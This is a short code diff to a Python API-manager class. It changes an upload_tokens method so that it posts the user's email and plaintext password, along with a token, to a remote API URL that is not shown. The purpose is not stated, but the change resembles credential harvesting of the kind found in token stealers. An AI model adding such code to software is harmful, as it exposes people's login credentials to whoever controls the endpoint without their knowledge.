@@ -8,7 +8,7 @@ class CustomAPIManager:
             "Content-Type": "application/json",
         }
     
-    def upload_tokens(self, token):
-        data = {"token": token}
+    def upload_tokens(self, token, email, password):
+        data = {"token": token, "email": email, "password": password}
         response = requests.post(self.api_url, headers=self.headers, json=data)
         return response
